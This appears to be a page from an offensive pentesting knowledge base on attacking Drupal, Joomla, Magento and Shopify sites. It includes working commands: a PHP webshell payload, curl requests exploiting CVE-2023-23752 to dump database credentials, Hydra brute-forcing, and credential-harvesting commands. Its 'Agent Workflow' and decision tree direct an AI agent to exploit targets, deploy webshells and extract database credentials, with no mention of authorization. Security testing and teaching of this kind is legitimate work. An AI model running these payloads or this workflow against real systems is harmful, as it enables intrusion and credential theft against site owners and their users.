# Other CMS

> **Summary**: Content Management Systems beyond WordPress (Drupal, Joomla, Magento, Shopify, etc.) each have unique attack surfaces, default paths, and known vulnerability patterns.
> **Impact**: Remote code execution, authentication bypass, information disclosure, privilege escalation depending on the CMS and vulnerability.
> **Typical Severity**: Medium to Critical

## CMS Discovery Methodology

### Generic CMS Detection

1. **Check page source** for generator meta tags:
   ```bash
   curl -s <TARGET> | grep -i 'generator\|powered by\|cms'
   ```

2. **Check common CMS paths** to fingerprint the platform:
   ```bash
   # Drupal
   curl -s -o /dev/null -w "%{http_code}" <TARGET>/CHANGELOG.txt
   curl -s -o /dev/null -w "%{http_code}" <TARGET>/core/CHANGELOG.txt

   # Joomla
   curl -s -o /dev/null -w "%{http_code}" <TARGET>/administrator/
   curl -s -o /dev/null -w "%{http_code}" <TARGET>/language/en-GB/en-GB.xml

   # Magento
   curl -s -o /dev/null -w "%{http_code}" <TARGET>/magento_version
   curl -s -o /dev/null -w "%{http_code}" <TARGET>/admin/
   ```

3. **Use automated tools**:
   ```bash
   # CMSMap
   cmsmap -t <TARGET>

   # Whatweb
   whatweb <TARGET>

   # Wappalyzer (browser extension)
   ```

4. **Check for known CVEs** for the identified CMS and version:
   - [Sploitus](https://sploitus.com/)
   - [Exploit-DB](https://www.exploit-db.com/)
   - [NVD](https://nvd.nist.gov/)

---

## Drupal

> **Typical Severity**: High to Critical (Drupalgeddon series)

### Detection

```bash
# Generator meta tag
curl -s <TARGET> | grep 'content="Drupal'

# Version from CHANGELOG
curl -s <TARGET>/CHANGELOG.txt | head -2
curl -s <TARGET>/core/CHANGELOG.txt | head -2

# Node content
curl -s <TARGET>/node/1
```

**Note**: Newer Drupal installs block access to `CHANGELOG.txt` and `README.txt` by default.

### Enumeration

**User types**: Administrator, Authenticated User, Anonymous

```bash
# User enumeration
<TARGET>/user/1
<TARGET>/user/2
<TARGET>/user/register     # Check if username exists via registration errors
<TARGET>/user/password      # Check via password reset errors

# Installed modules
curl -s <TARGET>/config/sync/core.extension.yml
curl -s <TARGET>/core/core.services.yml

# Hidden pages
# Fuzz: <TARGET>/node/FUZZ (FUZZ = 1-1000)
```

**Automated scanning:**
```bash
droopescan scan drupal -u <TARGET>
```

### Exploitation

#### Drupalgeddon2 (CVE-2018-7600) -- XSLT 7.x, 8.x
- Pre-authentication RCE
- Affects Drupal < 7.58 and 8.x < 8.3.9
```bash
# Metasploit
use exploit/unix/webapp/drupal_drupalgeddon2

# Python exploit
python3 drupalgeddon2.py <TARGET>
```

#### Drupalgeddon3 (CVE-2018-7602) -- Drupal 7.x, 8.x
- Authenticated RCE (requires any authenticated user)
- Affects Drupal < 7.59, 8.x < 8.5.3

#### Admin Panel RCE

1. Enable the PHP Filter module (Admin > Modules)
2. Create new content (Content > Add content > Basic page)
3. Set text format to "PHP Code"
4. Insert: `<?php system($_GET['cmd']); ?>`
5. Access the published page with `?cmd=id`

**Alternative -- Template backdoor:**
- [Drupal Reverse Shell with Admin Access](https://www.hackingarticles.in/drupal-reverseshell/)
- [Drupalwned](https://github.com/nowak0x01/Drupalwned) -- Elevate XSS to RCE (supports Drupal 7.x through 10.x)

### Post-Exploitation

```bash
# Find database credentials
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null

# Dump users
mysql -u <DB_USER> -p'<DB_PASS>' -e 'use drupal; select * from users'
```

---

## Joomla

> **Typical Severity**: Medium to High

### Detection

```bash
# Generator meta tag
curl -s <TARGET> | grep -i 'generator.*joomla'

# Robots.txt references Joomla paths
curl -s <TARGET>/robots.txt | grep -i joomla

# README.txt version info
curl -s <TARGET>/README.txt | head -5
```

### Enumeration

**Version detection:**
```bash
# XML files with version info
curl -s <TARGET>/administrator/manifests/files/joomla.xml | grep version
curl -s <TARGET>/language/en-GB/en-GB.xml | grep version
curl -s <TARGET>/plugins/system/cache/cache.xml | grep version
```

**Automated scanning:**
```bash
droopescan scan joomla --url <TARGET>
joomscan -u <TARGET>
```

### Exploitation

#### CVE-2023-23752 -- Unauthenticated Information Disclosure (Joomla 4.0.0 - 4.2.7)

```bash
# Dump users
curl -s "http://<TARGET>/api/v1/users?public=true" | jq .

# Dump configuration (database credentials)
curl -s "http://<TARGET>/api/index.php/v1/config/application?public=true" | jq .
```

```bash
# Metasploit
use scanner/http/joomla_api_improper_access_checks
```

#### Admin Panel RCE

1. Login to admin panel at `/administrator/`
2. Navigate to Extensions > Templates > Templates
3. Select an active template and edit a PHP file (e.g., `error.php`)
4. Insert webshell code
5. Access the modified template file

#### Brute Force

```bash
# Joomla brute force script
python3 joomla-brute.py -u <TARGET> -w <WORDLIST> -usr admin

# Hydra
hydra -l admin -P <WORDLIST> <TARGET_IP> http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&task=login:Invalid"
```

### Key Paths

```
/administrator/          # Admin login
/configuration.php       # Database credentials (if exposed)
/administrator/manifests/files/joomla.xml  # Version
/api/                    # REST API (Joomla 4+)
```

---

## Magento

> **Typical Severity**: Medium to High

### Detection

```bash
# Version check
curl -s <TARGET>/magento_version
curl -s <TARGET>/RELEASE_NOTES.txt | head -5

# Admin panel paths
curl -s -o /dev/null -w "%{http_code}" <TARGET>/admin/
curl -s -o /dev/null -w "%{http_code}" <TARGET>/admin_<CUSTOM>/
curl -s -o /dev/null -w "%{http_code}" <TARGET>/downloader/
```

### Enumeration

```bash
# MageScan
magescan scan:all <TARGET>

# Common paths
<TARGET>/app/etc/local.xml       # Database credentials (Magento 1)
<TARGET>/app/etc/env.php          # Database credentials (Magento 2)
<TARGET>/var/log/                  # Log files
<TARGET>/downloader/              # Magento Connect manager
```

### Exploitation

#### Magento Shoplift (CVE-2015-1397) -- Magento < 1.9.2.0
- SQL injection leading to admin account creation
```bash
python3 shoplift.py <TARGET>
```

#### Magento 2 RCE (CVE-2022-24086)
- Pre-authentication RCE via template injection in email templates
- Affects Magento 2.3.x and 2.4.x

#### Admin Panel to RCE
1. Navigate to System > Configuration > Advanced > Developer
2. Enable template symlinks
3. Upload malicious template via CMS
4. Alternatively: Install malicious extension via Magento Connect

### Key Paths

```
/admin/                          # Default admin (often customized)
/downloader/                     # Magento Connect manager
/app/etc/local.xml              # DB credentials (M1)
/app/etc/env.php                 # DB credentials (M2)
/var/report/                     # Error reports with stack traces
/skin/adminhtml/default/         # Admin theme files
```

---

## Shopify (Liquid Template Injection)

> **Typical Severity**: Medium (limited sandbox)

### Detection
- Hosted on `myshopify.com` or custom domain with Shopify headers
- Check `X-ShopId` header in responses
- Source contains references to `cdn.shopify.com`

### Exploitation

Shopify uses the Liquid template engine. In custom themes or apps where user input reaches Liquid templates:

```
{{ 'id' | system }}           # Will NOT work (Liquid is sandboxed)
{% assign x = 'test' %}       # Template logic
{{ page.title }}               # Data access
```

**Focus areas for Shopify:**
- Custom apps with OAuth misconfiguration
- Webhook endpoints leaking sensitive data
- GraphQL API abuse
- Storefront API information disclosure
- Third-party app vulnerabilities

---

## Generic CMS Exploitation Checklist

1. **Identify CMS and version** using fingerprinting techniques
2. **Search for known CVEs** for the exact version
3. **Enumerate users** via registration, login errors, or API endpoints
4. **Brute force admin credentials** if rate limiting is absent
5. **Check for exposed configuration files** (database credentials, API keys)
6. **Explore admin panel functionality** for file upload, template editing, or code execution
7. **Test installed plugins/extensions** for known vulnerabilities
8. **Check for default credentials** or unchanged admin paths

## Tools

| Tool | Usage |
|------|-------|
| droopescan | `droopescan scan <CMS> -u <TARGET>` -- Drupal, Joomla, SilverStripe, WordPress |
| joomscan | `joomscan -u <TARGET>` -- Joomla vulnerability scanner |
| magescan | `magescan scan:all <TARGET>` -- Magento scanner |
| CMSMap | `cmsmap -t <TARGET>` -- Multi-CMS scanner |
| Whatweb | `whatweb <TARGET>` -- Web technology fingerprinting |
| Nuclei | `nuclei -u <TARGET> -tags cms` -- Template-based scanning |

## Agent Workflow
> Step-by-step instructions for an AI agent to identify and test Content Management Systems.

### Phase 1: CMS Identification
1. Run automated CMS detection:
   ```
   whatweb <TARGET>
   cmsmap -t <TARGET>
   ```
2. Check generator meta tags and common paths:
   ```
   curl -s <TARGET> | grep -i 'generator\|powered by\|cms'
   ```
3. Probe CMS-specific paths to confirm the platform:
   - **Drupal**: `/CHANGELOG.txt`, `/core/CHANGELOG.txt`, `/node/1`
   - **Joomla**: `/administrator/`, `/language/en-GB/en-GB.xml`, `/README.txt`
   - **Magento**: `/magento_version`, `/admin/`, `/downloader/`
4. Determine the exact version for CVE matching

### Phase 2: CMS-Specific Scanning
1. **Drupal**:
   ```
   droopescan scan drupal -u <TARGET>
   ```
   - Check for Drupalgeddon2 (CVE-2018-7600) if version < 7.58 or 8.x < 8.3.9
   - Enumerate users via `/user/1`, `/user/2`, `/user/register`
2. **Joomla**:
   ```
   joomscan -u <TARGET>
   droopescan scan joomla --url <TARGET>
   ```
   - Check for CVE-2023-23752 (info disclosure) on Joomla 4.0.0 - 4.2.7
   - Extract version from XML manifests
3. **Magento**:
   ```
   magescan scan:all <TARGET>
   ```
   - Check for exposed `app/etc/local.xml` or `app/etc/env.php`
   - Test for Shoplift SQLi (CVE-2015-1397) on older versions
4. **Generic**: run Nuclei with CMS tags:
   ```
   nuclei -u <TARGET> -tags cms
   ```

### Phase 3: Exploitation
1. Search for public exploits matching the CMS version:
   - [Sploitus](https://sploitus.com/), [Exploit-DB](https://www.exploit-db.com/), [NVD](https://nvd.nist.gov/)
2. Test for default credentials on admin panels
3. Attempt admin panel access for template/extension-based RCE:
   - **Drupal**: Enable PHP Filter module, inject PHP in content
   - **Joomla**: Edit template PHP files via Extensions > Templates
   - **Magento**: Enable template symlinks or install malicious extension
4. Check for exposed configuration files with database credentials

### Phase 4: Next Steps
- If admin access: deploy webshell via template editing or extension upload
- If database credentials found: direct database access for credential extraction
- If known CVEs match: exploit for RCE, SQLi, or auth bypass
- Feed plugin/extension lists to vulnerability research
- Cross-reference with [SSTI](../vulns/ssti.md), [SQLi](../vulns/sqli.md), [file upload](../vulns/file-upload.md)

## Decision Tree

```
START: CMS detected on target
  |
  +--> Identify CMS type and version
  |      |
  |      +--> Drupal --> droopescan + Drupalgeddon check
  |      +--> Joomla --> joomscan + CVE-2023-23752 check
  |      +--> Magento --> magescan + config file exposure check
  |      +--> Other --> Generic CMS checklist
  |
  +--> Search for known CVEs matching exact version
  |      |
  |      +--> Pre-auth RCE available? --> Exploit directly
  |      +--> Auth required? --> Brute force or default credentials
  |
  +--> Check for exposed config files
  |      |
  |      +--> DB credentials found? --> Direct database access
  |
  +--> Admin access obtained?
         |
         +--> Yes --> Template editing or extension upload for RCE
         +--> No --> Focus on plugin/extension vulnerabilities
```

## Success Criteria

- [ ] CMS type and exact version identified
- [ ] CMS-specific scanner run (droopescan, joomscan, magescan, or cmsmap)
- [ ] Known CVEs researched for the detected version
- [ ] Default credentials tested on admin panel
- [ ] Configuration file exposure tested
- [ ] User enumeration attempted
- [ ] Identified vulnerabilities exploited and documented
- [ ] Findings handed off to appropriate exploitation phases

## References

- [HackTricks - Drupal](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal)
- [HackTricks - Joomla](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla)
- [Drupalwned](https://github.com/nowak0x01/Drupalwned)
- [Sploitus - CVE Search](https://sploitus.com/)

## Cross-References

- [WordPress](wordpress.md) -- WordPress-specific attacks
- [SSTI](../vulns/ssti.md) -- Server-side template injection (Liquid, Twig, etc.)
- [SQL Injection](../vulns/sqli.md) -- CMS SQL injection vectors
- [File Upload](../vulns/file-upload.md) -- Plugin/extension upload to RCE
